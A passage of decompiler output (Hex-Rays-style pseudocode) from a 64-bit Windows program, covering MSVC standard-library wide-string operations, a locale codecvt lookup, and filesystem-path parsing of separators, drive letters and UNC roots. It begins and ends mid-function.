    if ( v20 > 0x7FFFFFFFFFFFFFFEi64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v21 = v8[3];
    if ( v21 >= v20 )
    {
      if ( v20 )
      {
LABEL_34:
        if ( v6 < a5 )
        {
          v22 = v8[3];
          v23 = v22 < 8 ? v8 : *v8;
          v24 = v22 < 8 ? v8 : *v8;
          if ( v15 )
            memmove((char *)v24 + 2 * (v7 + a5), (char *)v23 + 2 * (v7 + v6), 2 * v15);
        }
        if ( v8[3] < 8ui64 )
          v25 = v8;
        else
          v25 = (_WORD *)*v8;
        if ( a5 )
          memcpy(&v25[v7], v5, 2 * a5);
        v26 = v8[3] < 8ui64;
        v8[2] = v20;
        if ( v26 )
          v27 = v8;
        else
          v27 = (_QWORD *)*v8;
        *((_WORD *)v27 + v20) = 0;
        return v8;
      }
      v8[2] = 0i64;
      if ( v21 < 8 )
        *(_WORD *)v8 = 0;
      else
        *(_WORD *)*v8 = 0;
    }
    else
    {
      sub_1400048A0(v8, v20, v19);
      if ( v20 )
        goto LABEL_34;
    }
    return v8;
  }
  if ( v9 < 8 )
    v11 = (char *)v8;
  else
    v11 = (char *)*v8;
  return sub_14002EA40(v8, a2, v6, v8, (a4 - v11) >> 1, a5);
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140031390) ----------------------------------------------------
_QWORD *__fastcall sub_140031390(void *Src, _BYTE *a2, _BYTE *a3)
{
  _QWORD *v3; // rbx
  void *v4; // r10
  char *v5; // r11
  unsigned __int64 v6; // r9
  _QWORD *v7; // rcx
  _QWORD *v8; // rax
  void *Srca; // [rsp+40h] [rbp-38h]
  __int64 v11; // [rsp+50h] [rbp-28h]
  unsigned __int64 v12; // [rsp+58h] [rbp-20h]

  v3 = Src;
  *((_QWORD *)Src + 3) = 7i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_WORD *)Src = 0;
  if ( a2 != a3 )
  {
    v12 = 7i64;
    v11 = 0i64;
    LOWORD(Srca) = 0;
    sub_14002E600(&Srca, a2, (a3 - a2) >> 1);
    v4 = &Srca;
    if ( v12 >= 8 )
      v4 = Srca;
    v5 = (char *)&Srca;
    if ( v12 >= 8 )
      v5 = (char *)Srca;
    v6 = v3[3];
    if ( v6 < 8 )
      v7 = v3;
    else
      v7 = (_QWORD *)*v3;
    if ( v6 < 8 )
      v8 = v3;
    else
      v8 = (_QWORD *)*v3;
    sub_140032EB0(v3, (__int64)v8 + 2 * v3[2], (__int64)v7 + 2 * v3[2], v5, (__int64)v4 + 2 * v11);
    if ( v12 >= 8 )
      operator delete(Srca);
  }
  return v3;
}

//----- (0000000140031490) ----------------------------------------------------
bool __fastcall sub_140031490(__int64 a1, __int64 a2)
{
  char v2; // al

  if ( *(_QWORD *)(a1 + 32) != *(_QWORD *)(a2 + 32) || (v2 = 1, *(_QWORD *)(a1 + 40) != *(_QWORD *)(a2 + 40)) )
    v2 = 0;
  return v2 == 0;
}

//----- (00000001400314C0) ----------------------------------------------------
__int64 __fastcall sub_1400314C0(__int64 *a1)
{
  __int64 *v1; // rsi
  __int64 v2; // rcx
  unsigned __int64 v3; // rdi
  __int64 v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rax
  char v8; // [rsp+28h] [rbp-20h]
  char v9; // [rsp+50h] [rbp+8h]
  __int64 v10; // [rsp+58h] [rbp+10h]

  v1 = a1;
  std::_Lockit::_Lockit((std::_Lockit *)&v9, 0);
  v10 = qword_1400DA710;
  v3 = std::locale::id::operator unsigned __int64(std::codecvt<wchar_t,char,int>::id);
  v4 = *v1;
  if ( v3 >= *(_QWORD *)(*v1 + 24) )
  {
    v5 = 0i64;
  }
  else
  {
    v2 = *(_QWORD *)(v4 + 16);
    v5 = *(_QWORD *)(v2 + 8 * v3);
    if ( v5 )
      goto LABEL_14;
  }
  if ( !*(_BYTE *)(v4 + 36) )
    goto LABEL_8;
  v6 = std::locale::_Getgloballocale(v2);
  if ( v3 < *(_QWORD *)(v6 + 24) )
  {
    v5 = *(_QWORD *)(*(_QWORD *)(v6 + 16) + 8 * v3);
LABEL_8:
    if ( v5 )
      goto LABEL_14;
  }
  v5 = v10;
  if ( !v10 )
  {
    if ( std::codecvt<wchar_t,char,int>::_Getcat(&v10, v1) == -1 )
    {
      std::bad_cast::bad_cast((std::bad_cast *)&v8, "bad cast");
      CxxThrowException(&v8, &_TI2_AVbad_cast_std__);
    }
    v5 = v10;
    qword_1400DA710 = v10;
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v10 + 8i64))(v10);
    unknown_libname_8(v5);
  }
LABEL_14:
  std::_Lockit::~_Lockit((std::_Lockit *)&v9);
  return v5;
}
// 140086120: using guessed type __int64 __fastcall unknown_libname_8(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1558: using guessed type __int64 __fastcall std::codecvt<wchar_t,char,int>::_Getcat(_QWORD, _QWORD);
// 1400A16F0: using guessed type __int64 __cdecl std::locale::_Getgloballocale(_QWORD);
// 1400A16F8: using guessed type __int64 __fastcall std::locale::id::operator unsigned __int64(_QWORD);
// 1400A1700: using guessed type _QWORD std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 1400A1708: using guessed type _QWORD std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 1400A1A18: using guessed type _QWORD std::bad_cast::bad_cast(std::bad_cast *__hidden this, const char *);
// 1400D3168: using guessed type int _TI2_AVbad_cast_std__;
// 1400DA710: using guessed type __int64 qword_1400DA710;

//----- (00000001400315D0) ----------------------------------------------------
__int64 *__fastcall sub_1400315D0(__int64 *a1, __int16 a2)
{
  __int16 v2; // di
  __int64 *v3; // rbx
  _WORD *v4; // rax
  bool v5; // cf
  __int64 v6; // rax

  v2 = a2;
  v3 = a1;
  if ( (unsigned __int64)a1[3] < 1 )
    sub_1400048A0(a1, 1ui64, a1[2]);
  if ( (unsigned __int64)v3[3] < 8 )
    v4 = v3;
  else
    v4 = (_WORD *)*v3;
  *v4 = v2;
  v5 = (unsigned __int64)v3[3] < 8;
  v3[2] = 1i64;
  if ( v5 )
    v6 = (__int64)v3;
  else
    v6 = *v3;
  *(_WORD *)(v6 + 2) = 0;
  return v3;
}

//----- (0000000140031640) ----------------------------------------------------
_QWORD *__fastcall sub_140031640(void *Src, _QWORD *a2)
{
  _QWORD *v2; // rdi
  _QWORD *v3; // rbx
  _WORD *v4; // rax
  __int64 v5; // rcx
  unsigned __int64 v6; // rax
  _QWORD *v7; // rdx
  _QWORD *v8; // rax
  __int16 v9; // cx
  _WORD *v10; // rax
  __int64 v11; // rax
  unsigned __int64 v12; // rcx
  _QWORD *v13; // rdx
  signed __int64 v14; // r8
  _QWORD *v15; // rax
  __int16 v16; // cx
  void *Srca; // [rsp+28h] [rbp-30h]
  __int64 v19; // [rsp+38h] [rbp-20h]
  unsigned __int64 v20; // [rsp+40h] [rbp-18h]

  v2 = a2;
  v3 = Src;
  if ( a2[2] )
  {
    if ( Src == a2 )
    {
      v20 = 7i64;
      v19 = 0i64;
      LOWORD(Srca) = 0;
      sub_140005050(&Srca, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v4 = &Srca;
      if ( v20 >= 8 )
        v4 = Srca;
      if ( *v4 != 47 && *v4 != 92 )
      {
        v5 = v3[2];
        if ( v5 )
        {
          v6 = v3[3];
          v7 = v6 < 8 ? v3 : *v3;
          if ( *((_WORD *)v7 + v5 - 1) != 58 )
          {
            v8 = v6 < 8 ? v3 : *v3;
            v9 = *((_WORD *)v8 + v5 - 1);
            if ( v9 != 47 && v9 != 92 )
              sub_14001C4B0(v3, 1ui64, 92);
          }
        }
      }
      sub_14002E4C0(v3, &Srca, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      if ( v20 >= 8 )
        operator delete(Srca);
    }
    else
    {
      if ( a2[3] < 8ui64 )
        v10 = a2;
      else
        v10 = (_WORD *)*a2;
      if ( *v10 != 47 && *v10 != 92 )
      {
        v11 = *((_QWORD *)Src + 2);
        if ( v11 )
        {
          v12 = *((_QWORD *)Src + 3);
          v13 = v12 < 8 ? v3 : *v3;
          v14 = 2 * v11;
          if ( *((_WORD *)v13 + v11 - 1) != 58 )
          {
            v15 = v12 < 8 ? v3 : *v3;
            v16 = *(_WORD *)((char *)v15 + v14 - 2);
            if ( v16 != 47 && v16 != 92 )
              sub_14001C4B0(v3, 1ui64, 92);
          }
        }
      }
      sub_14002E4C0(v3, v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    }
  }
  return v3;
}

//----- (00000001400317F0) ----------------------------------------------------
_QWORD *__fastcall sub_1400317F0(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = std::codecvt<wchar_t,char,int>::`vftable';
  *a1 = std::codecvt_base::`vftable';
  *a1 = std::locale::facet::`vftable';
  *a1 = std::_Facet_base::`vftable';
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400A1520: using guessed type void *std::codecvt<wchar_t,char,int>::`vftable';
// 1400A1530: using guessed type void *std::codecvt_base::`vftable';
// 1400A1538: using guessed type void *std::locale::facet::`vftable';
// 1400A1540: using guessed type void *std::_Facet_base::`vftable';

//----- (0000000140031840) ----------------------------------------------------
unsigned __int64 *__fastcall sub_140031840(_QWORD *a1, __int64 a2)
{
  unsigned __int64 *v2; // r14
  _QWORD *v3; // rsi
  unsigned __int64 v4; // rbx
  unsigned __int64 *v5; // rax
  unsigned __int64 v6; // rax
  unsigned __int64 v8; // [rsp+38h] [rbp-60h]
  __int64 v9; // [rsp+40h] [rbp-58h]
  __int64 v10; // [rsp+48h] [rbp-50h]
  void *v11; // [rsp+50h] [rbp-48h]
  unsigned __int64 v12; // [rsp+68h] [rbp-30h]

  v9 = -2i64;
  v2 = (unsigned __int64 *)a2;
  v3 = a1;
  v10 = a2;
  v4 = 0i64;
  *(_QWORD *)(a2 + 24) = 7i64;
  *(_QWORD *)(a2 + 16) = 0i64;
  *(_WORD *)a2 = 0;
  *(_QWORD *)(a2 + 32) = a1;
  sub_140032330(a1, (_QWORD *)(a2 + 40), &v8, 0xFFFFFFFFFFFFFFFFui64);
  v5 = sub_140033240(v3, &v11, v2[5], v8);
  if ( v2 != v5 )
    sub_140005050(v2, v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v12 >= 8 )
    operator delete(v11);
  if ( *(_WORD *)off_1400D8040 )
  {
    v6 = -1i64;
    do
      ++v6;
    while ( *((_WORD *)off_1400D8040 + v6) );
  }
  else
  {
    v6 = 0i64;
  }
  if ( !(unsigned int)sub_1400319C0(v2, 0i64, v2[2], off_1400D8040, v6) )
  {
    if ( *(_WORD *)off_1400D8038 )
    {
      v4 = -1i64;
      do
        ++v4;
      while ( *((_WORD *)off_1400D8038 + v4) );
    }
    sub_14002E600(v2, off_1400D8038, v4);
  }
  return v2;
}
// 1400D8040: using guessed type void *off_1400D8040;

//----- (00000001400319C0) ----------------------------------------------------
signed __int64 __fastcall sub_1400319C0(_QWORD *a1, unsigned __int64 a2, unsigned __int64 a3, _WORD *a4, unsigned __int64 a5)
{
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // rbx
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // rdx
  unsigned int v9; // er10
  _WORD *v10; // rcx
  signed int v11; // edx
  signed __int64 result; // rax

  v5 = a1[2];
  v6 = a2;
  if ( v5 < a2 )
  {
    std::_Xout_of_range("invalid string position");
    __debugbreak();
  }
  v7 = v5 - a2;
  if ( v7 < a3 )
    a3 = v7;
  if ( a1[3] >= 8ui64 )
    a1 = (_QWORD *)*a1;
  v8 = a5;
  if ( a3 < a5 )
    v8 = a3;
  v9 = 0;
  if ( v8 )
  {
    v10 = (_WORD *)((char *)a1 + 2 * v6);
    while ( *v10 == *a4 )
    {
      ++v10;
      ++a4;
      if ( !--v8 )
        goto LABEL_13;
    }
    v11 = 1;
    if ( *v10 < *a4 )
      v11 = -1;
  }
  else
  {
LABEL_13:
    v11 = 0;
  }
  result = v11;
  if ( !v11 )
  {
    if ( a3 >= a5 )
    {
      LOBYTE(v9) = a3 != a5;
      result = v9;
    }
    else
    {
      result = 0xFFFFFFFFi64;
    }
  }
  return result;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);

//----- (0000000140031C70) ----------------------------------------------------
__int64 __fastcall sub_140031C70(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a2 + 24) = 7i64;
  *(_QWORD *)(a2 + 16) = 0i64;
  *(_WORD *)a2 = 0;
  *(_QWORD *)(a2 + 32) = a1;
  *(_QWORD *)(a2 + 40) = *(_QWORD *)(a1 + 16);
  return a2;
}

//----- (0000000140031CA0) ----------------------------------------------------
_QWORD *__fastcall sub_140031CA0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // r14
  __int64 v3; // rdx
  __int64 v4; // rcx
  _QWORD *v5; // rbx
  __int64 v6; // rsi
  unsigned __int64 *v7; // rdi
  __int64 v8; // rbx
  unsigned __int64 *v9; // rax
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // r8
  __int64 v13; // r9
  _QWORD *v14; // rbx
  __int64 v15; // rsi
  unsigned __int64 *v16; // rdi
  __int64 v17; // rbx
  unsigned __int64 *v18; // rax
  signed __int64 v19; // rcx
  void **v20; // rdx
  char v21; // bl
  char *v22; // rax
  char *v23; // rdx
  unsigned __int64 v24; // r8
  char v25; // bl
  char v27; // [rsp+48h] [rbp-B8h]
  char v28; // [rsp+78h] [rbp-88h]
  void *v29; // [rsp+A8h] [rbp-58h]
  unsigned __int64 v30; // [rsp+C0h] [rbp-40h]
  void *Src; // [rsp+C8h] [rbp-38h]
  __int64 v32; // [rsp+D8h] [rbp-28h]
  unsigned __int64 v33; // [rsp+E0h] [rbp-20h]
  void *v34; // [rsp+F8h] [rbp-8h]
  __int64 v35; // [rsp+108h] [rbp+8h]
  unsigned __int64 v36; // [rsp+110h] [rbp+10h]

  v2 = a2;
  sub_140031F10(a1, &v29);
  v5 = (_QWORD *)sub_140031BF0(v4, v3);
  v6 = sub_140031C70((__int64)v5, (__int64)&v34);
  v7 = sub_140031840(v5, (__int64)&Src);
  v8 = sub_140031C70((__int64)&v29, (__int64)&v27);
  v9 = sub_140031840(&v29, (__int64)&v28);
  if ( (unsigned int)sub_1400325C0(v9, v8, (__int64)v7, v6)
    && (v14 = (_QWORD *)sub_140031B70(v11, v10, v12, v13, 0),
        v15 = sub_140031C70((__int64)v14, (__int64)&v27),
        v16 = sub_140031840(v14, (__int64)&v34),
        v17 = sub_140031C70((__int64)&v29, (__int64)&Src),
        v18 = sub_140031840(&v29, (__int64)&v28),
        (unsigned int)sub_1400325C0(v18, v17, (__int64)v16, v15)) )
  {
    v19 = sub_140032F60((char *)&v29, 46, 0xFFFFFFFFFFFFFFFFui64);
    if ( v19 == -1 )
    {
      v36 = 7i64;
      v35 = 0i64;
      LOWORD(v34) = 0;
      v20 = &v34;
      v21 = 2;
    }
    else
    {
      v22 = (char *)&v29;
      if ( v30 >= 8 )
        v22 = (char *)v29;
      v23 = &v22[2 * v19];
      v33 = 7i64;
      v32 = 0i64;
      LOWORD(Src) = 0;
      if ( *(_WORD *)v23 )
      {
        v24 = -1i64;
        do
          ++v24;
        while ( *(_WORD *)&v23[2 * v24] );
      }
      else
      {
        v24 = 0i64;
      }
      sub_14002E600(&Src, v23, v24);
      v20 = &Src;
      v21 = 4;
    }
    v2[3] = 7i64;
    v2[2] = 0i64;
    *(_WORD *)v2 = 0;
    sub_140005050(v2, v20, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v25 = v21 | 1;
    if ( v25 & 4 )
    {
      v25 &= 0xFBu;
      if ( v33 >= 8 )
        operator delete(Src);
      v33 = 7i64;
      v32 = 0i64;
      LOWORD(Src) = 0;
    }
    if ( v25 & 2 && v36 >= 8 )
      operator delete(v34);
  }
  else
  {
    v2[3] = 7i64;
    v2[2] = 0i64;
    *(_WORD *)v2 = 0;
  }
  if ( v30 >= 8 )
    operator delete(v29);
  return v2;
}
// 140031B70: using guessed type __int64 __cdecl sub_140031B70(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 140031BF0: using guessed type __int64 __cdecl sub_140031BF0(_QWORD, _QWORD);

//----- (0000000140031F10) ----------------------------------------------------
_QWORD *__fastcall sub_140031F10(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rsi
  __int64 *v3; // rdi
  __int64 v4; // rbx
  signed __int64 v5; // rax
  unsigned __int64 v6; // rbp
  __int64 v7; // rax
  __int16 v8; // cx
  __int64 v9; // rdx
  __int64 v10; // rcx
  _QWORD *v11; // rax
  void **v12; // rdx
  char v13; // bl
  _WORD *v14; // rdx
  unsigned __int64 v15; // r8
  char v16; // bl
  void *v18; // [rsp+30h] [rbp-68h]
  __int64 v19; // [rsp+40h] [rbp-58h]
  unsigned __int64 v20; // [rsp+48h] [rbp-50h]
  void *Src; // [rsp+50h] [rbp-48h]
  __int64 v22; // [rsp+60h] [rbp-38h]
  unsigned __int64 v23; // [rsp+68h] [rbp-30h]

  v2 = a2;
  v3 = (__int64 *)a1;
  v4 = *(_QWORD *)(a1 + 16);
  v5 = sub_1400320C0((char *)a1, *(_QWORD *)(a1 + 16));
  v6 = v5;
  if ( v4
    && v5
    && ((unsigned __int64)v3[3] < 8 ? (v7 = (__int64)v3) : (v7 = *v3),
        ((v8 = *(_WORD *)(v7 + 2 * v6), v8 == 47) || v8 == 92) && !sub_1400324B0(v3, v6)) )
  {
    v11 = (_QWORD *)sub_140031BF0(v10, v9);
    v23 = 7i64;
    v22 = 0i64;
    LOWORD(Src) = 0;
    sub_140005050(&Src, v11, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v12 = &Src;
    v13 = 1;
  }
  else
  {
    if ( (unsigned __int64)v3[3] >= 8 )
      v3 = (__int64 *)*v3;
    v14 = (_WORD *)((char *)v3 + 2 * v6);
    v20 = 7i64;
    v19 = 0i64;
    LOWORD(v18) = 0;
    if ( *v14 )
    {
      v15 = -1i64;
      do
        ++v15;
      while ( v14[v15] );
    }
    else
    {
      v15 = 0i64;
    }
    sub_14002E600(&v18, v14, v15);
    v12 = &v18;
    v13 = 2;
  }
  v2[3] = 7i64;
  v2[2] = 0i64;
  *(_WORD *)v2 = 0;
  sub_140005050(v2, v12, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v16 = v13 | 4;
  if ( v16 & 2 )
  {
    v16 &= 0xFDu;
    if ( v20 >= 8 )
      operator delete(v18);
    v20 = 7i64;
    v19 = 0i64;
    LOWORD(v18) = 0;
  }
  if ( v16 & 1 && v23 >= 8 )
    operator delete(Src);
  return v2;
}
// 140031BF0: using guessed type __int64 __cdecl sub_140031BF0(_QWORD, _QWORD);

//----- (00000001400320C0) ----------------------------------------------------
signed __int64 __fastcall sub_1400320C0(char *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  char *v3; // rbx
  unsigned __int64 v4; // rax
  char *v5; // rax
  __int16 v6; // cx
  char *v8; // rax
  __int16 v9; // cx
  signed __int64 v10; // rax

  v2 = a2;
  v3 = a1;
  if ( a2 == 2 )
  {
    v4 = *((_QWORD *)a1 + 3);
    if ( v4 >= 8 )
      a1 = *(char **)a1;
    if ( *(_WORD *)a1 == 47 || *(_WORD *)a1 == 92 )
    {
      v5 = v4 < 8 ? v3 : *(_QWORD *)v3;
      v6 = *((_WORD *)v5 + 1);
      if ( v6 == 47 || v6 == 92 )
        return 0i64;
    }
  }
  else if ( !a2 )
  {
    goto LABEL_19;
  }
  if ( *((_QWORD *)v3 + 3) < 8ui64 )
    v8 = v3;
  else
    v8 = *(char **)v3;
  v9 = *(_WORD *)&v8[2 * a2 - 2];
  if ( v9 == 47 || v9 == 92 )
    return a2 - 1;
LABEL_19:
  v10 = sub_140032280(v3, &word_1400A7850, a2 - 1, 2i64);
  if ( v10 == -1 )
  {
    if ( v2 <= 1 )
      return 0i64;
    v10 = sub_140032F60(v3, 58, v2 - 2);
    if ( v10 == -1 )
      return 0i64;
  }
  if ( v10 == 1 )
  {
    if ( *((_QWORD *)v3 + 3) >= 8ui64 )
      v3 = *(char **)v3;
    if ( *(_WORD *)v3 == 47 || *(_WORD *)v3 == 92 )
      return 0i64;
  }
  return v10 + 1;
}
// 1400A7850: using guessed type __int16 word_1400A7850;

//----- (00000001400321D0) ----------------------------------------------------
signed __int64 __fastcall sub_1400321D0(char *a1, _WORD *a2, unsigned __int64 a3, __int64 a4)
{
  unsigned __int64 v4; // r11
  _WORD *v5; // rsi
  char *v6; // r10
  unsigned __int64 v7; // rax
  char *v8; // r8
  unsigned __int64 v9; // rbx
  char *v10; // rax
  char *v11; // rdx
  __int64 v12; // rcx
  _WORD *v13; // rax

  v4 = a3;
  v5 = a2;
  v6 = a1;
  if ( !a4 )
    return -1i64;
  v7 = *((_QWORD *)a1 + 2);
  if ( a3 >= v7 )
    return -1i64;
  v8 = *((_QWORD *)a1 + 3) < 8ui64 ? a1 : *(_QWORD *)a1;
  v9 = (unsigned __int64)&v8[2 * v7];
  v10 = *((_QWORD *)a1 + 3) < 8ui64 ? a1 : *(_QWORD *)a1;
  v11 = &v10[2 * v4];
  if ( (unsigned __int64)v11 >= v9 )
    return -1i64;
  while ( !a4 )
  {
LABEL_14:
    v11 += 2;
    if ( (unsigned __int64)v11 >= v9 )
      return -1i64;
  }
  v12 = a4;
  v13 = v5;
  while ( *v13 != *(_WORD *)v11 )
  {
    ++v13;
    if ( !--v12 )
      goto LABEL_14;
  }
  if ( *((_QWORD *)v6 + 3) >= 8ui64 )
    v6 = *(char **)v6;
  return (v11 - v6) >> 1;
}

//----- (0000000140032280) ----------------------------------------------------
signed __int64 __fastcall sub_140032280(char *a1, _WORD *a2, unsigned __int64 a3, __int64 a4)
{
  __int64 v4; // rsi
  _WORD *v5; // r14
  char *v6; // rdi
  unsigned __int64 v7; // rax
  _QWORD *v8; // rax
  char *v9; // rbx
  __int64 v10; // rcx
  _WORD *v11; // rax

  v4 = a4;
  v5 = a2;
  v6 = a1;
  if ( !a4 )
    return -1i64;
  v7 = *((_QWORD *)a1 + 2);
  if ( !v7 )
    return -1i64;
  if ( a3 >= v7 )
    a3 = v7 - 1;
  if ( *((_QWORD *)a1 + 3) < 8ui64 )
    v8 = a1;
  else
    v8 = *(_QWORD **)a1;
  v9 = (char *)v8 + 2 * a3;
  while ( !v4 )
  {
LABEL_13:
    if ( v9 == (char *)sub_140004B70(v6) )
      return -1i64;
    v9 -= 2;
  }
  v10 = v4;
  v11 = v5;
  while ( *v11 != *(_WORD *)v9 )
  {
    ++v11;
    if ( !--v10 )
      goto LABEL_13;
  }
  if ( *((_QWORD *)v6 + 3) >= 8ui64 )
    v6 = *(char **)v6;
  return (v9 - v6) >> 1;
}

//----- (0000000140032330) ----------------------------------------------------
unsigned __int64 __fastcall sub_140032330(_QWORD *a1, _QWORD *a2, _QWORD *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r11
  _QWORD *v5; // r10
  _QWORD *v6; // rbx
  unsigned __int64 result; // rax
  unsigned __int64 v8; // r8
  _WORD *v9; // rdx
  _QWORD *v10; // rdx
  __int16 v11; // r9
  _QWORD *v12; // rdx
  __int16 v13; // r8
  _WORD *v14; // rdx
  bool v15; // zf
  unsigned __int64 v16; // rdx
  _QWORD *v17; // r8
  _QWORD *v18; // rdx
  __int16 v19; // r8
  unsigned __int64 v20; // rdx
  _QWORD *v21; // r8
  __int16 v22; // r9

  v4 = a4;
  v5 = a3;
  v6 = a2;
  if ( a4 == -1i64 )
    v4 = a1[2];
  result = 0i64;
  *a2 = 0i64;
  *a3 = 0i64;
  if ( a1[2] )
  {
    if ( v4 >= 2 )
    {
      v8 = a1[3];
      v9 = v8 < 8 ? a1 : *a1;
      if ( *v9 == 47 || *v9 == 92 )
      {
        v10 = v8 < 8 ? a1 : *a1;
        v11 = *((_WORD *)v10 + 1);
        if ( v11 == 47 || v11 == 92 )
        {
          if ( v4 == 2
            || (v8 < 8 ? (v12 = a1) : (v12 = (_QWORD *)*a1), (v13 = *((_WORD *)v12 + 2), v13 != 47) && v13 != 92) )
          {
            result = 2i64;
            *v5 = 2i64;
LABEL_27:
            v15 = result == v4;
            if ( result < v4 )
            {
              do
              {
                v16 = a1[3];
                if ( v16 < 8 )
                  v17 = a1;
                else
                  v17 = (_QWORD *)*a1;
                if ( *((_WORD *)v17 + result) == 58 )
                  break;
                v18 = v16 < 8 ? a1 : *a1;
                v19 = *((_WORD *)v18 + result);
                if ( v19 == 47 )
                  break;
                if ( v19 == 92 )
                  break;
                ++*v5;
                ++result;
              }
              while ( result < v4 );
              v15 = result == v4;
            }
            if ( !v15 )
            {
              if ( a1[3] >= 8ui64 )
                a1 = (_QWORD *)*a1;
              if ( *((_WORD *)a1 + result) == 58 )
                ++*v5;
            }
            return result;
          }
        }
      }
    }
    if ( a1[3] < 8ui64 )
      v14 = a1;
    else
      v14 = (_WORD *)*a1;
    if ( *v14 != 47 && *v14 != 92 )
      goto LABEL_27;
    v20 = 1i64;
    for ( *v5 = 1i64; v20 < v4; result += 2i64 )
    {
      if ( a1[3] < 8ui64 )
        v21 = a1;
      else
        v21 = (_QWORD *)*a1;
      v22 = *(_WORD *)((char *)v21 + result + 2);
      if ( v22 != 47 && v22 != 92 )
        break;
      ++*v6;
      ++v20;
    }
  }
  return result;
}

//----- (00000001400324B0) ----------------------------------------------------
bool __fastcall sub_1400324B0(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 i; // rbx
  __int64 *v3; // rax
  __int16 v4; // dx
  unsigned __int64 v5; // r8
  _WORD *v6; // rax
  unsigned __int64 v8; // rax
  __int64 *v9; // rdx
  __int64 v10; // rax
  __int16 v11; // dx

  for ( i = a2; i; --i )
  {
    if ( (unsigned __int64)a1[3] < 8 )
      v3 = a1;
    else
      v3 = (__int64 *)*a1;
    v4 = *((_WORD *)v3 + i - 1);
    if ( v4 != 47 && v4 != 92 )
      break;
  }
  if ( !i )
    return 1;
  if ( i == 2 )
  {
    v5 = a1[3];
    if ( v5 < 8 )
      v6 = a1;
    else
      v6 = (_WORD *)*a1;
    if ( (unsigned __int16)(*v6 - 97) <= 0x19u || (unsigned __int16)(*v6 - 65) <= 0x19u )
    {
      if ( v5 >= 8 )
        a1 = (__int64 *)*a1;
      if ( *((_WORD *)a1 + 1) == 58 )
        return 1;
    }
  }
  else if ( i >= 3 )
  {
    v8 = a1[3];
    v9 = v8 < 8 ? a1 : *a1;
    if ( *(_WORD *)v9 == 47 || *(_WORD *)v9 == 92 )
    {
      v10 = (__int64)(v8 < 8 ? a1 : *a1);
      v11 = *(_WORD *)(v10 + 2);
      if ( v11 == 47 || v11 == 92 )
        return sub_1400321D0((char *)a1, &word_1400A7850, 2ui64, 2i64) == i;
    }
  }
  return 0;
}
// 1400A7850: using guessed type __int16 word_1400A7850;

//----- (00000001400325C0) ----------------------------------------------------
__int64 __fastcall sub_1400325C0(void *Src, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rsi
  __int64 v5; // rbx
  __int64 v6; // r14
  _QWORD *v7; // rdi
  unsigned int v8; // er15
  unsigned __int64 v9; // r10
  unsigned __int64 v10; // rbp
  _WORD *v11; // rcx
  unsigned __int64 v12; // r9
  unsigned __int64 v13; // r11
  _WORD *v14; // rdx
  __int64 v15; // r8
  bool i; // zf
  signed int v17; // er8
  signed int v18; // eax
  _WORD *v19; // rdx
  _WORD *v20; // rcx
  __int64 v21; // r8
  bool j; // zf
  signed int v23; // er8
  signed int v24; // eax
  bool v25; // cf
  __int64 result; // rax
  __int64 v27; // rcx
  __int64 v28; // rdx
  char v29; // al

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = Src;
  v8 = 1;
  if ( sub_140031490((__int64)Src, a2) )
  {
    while ( sub_140031490(v5, v4) )
    {
      v9 = *(_QWORD *)(v5 + 16);
      v10 = *(_QWORD *)(v5 + 24);
      if ( v10 < 8 )
        v11 = (_WORD *)v5;
      else
        v11 = *(_WORD **)v5;
      v12 = v7[2];
      v13 = v7[3];
      if ( v13 < 8 )
        v14 = v7;
      else
        v14 = (_WORD *)*v7;
      v15 = *(_QWORD *)(v5 + 16);
      if ( v12 < v9 )
        v15 = v7[2];
      for ( i = v15 == 0; ; i = v15 == 0 )
      {
        if ( i )
        {
          v17 = 0;
          goto LABEL_19;
        }
        if ( *v14 != *v11 )
          break;
        ++v14;
        ++v11;
        --v15;
      }
      v17 = 1;
      if ( *v14 < *v11 )
        v17 = -1;
LABEL_19:
      v18 = v17;
      if ( !v17 )
      {
        if ( v12 >= v9 )
          v18 = v7[2] != v9;
        else
          v18 = -1;
      }
      if ( v18 < 0 )
      {
        if ( v13 >= 8 )
          operator delete((void *)*v7);
        v7[3] = 7i64;
        v7[2] = 0i64;
        *(_WORD *)v7 = 0;
        if ( *(_QWORD *)(v6 + 24) >= 8ui64 )
          operator delete(*(void **)v6);
        *(_QWORD *)(v6 + 24) = 7i64;
        *(_QWORD *)(v6 + 16) = 0i64;
        *(_WORD *)v6 = 0;
        if ( *(_QWORD *)(v5 + 24) >= 8ui64 )
          operator delete(*(void **)v5);
        *(_QWORD *)(v5 + 24) = 7i64;
        *(_QWORD *)(v5 + 16) = 0i64;
        *(_WORD *)v5 = 0;
        if ( *(_QWORD *)(v4 + 24) >= 8ui64 )
          operator delete(*(void **)v4);
        result = 0xFFFFFFFFi64;
        goto LABEL_85;
      }
      if ( v13 < 8 )
        v19 = v7;
      else
        v19 = (_WORD *)*v7;
      if ( v10 < 8 )
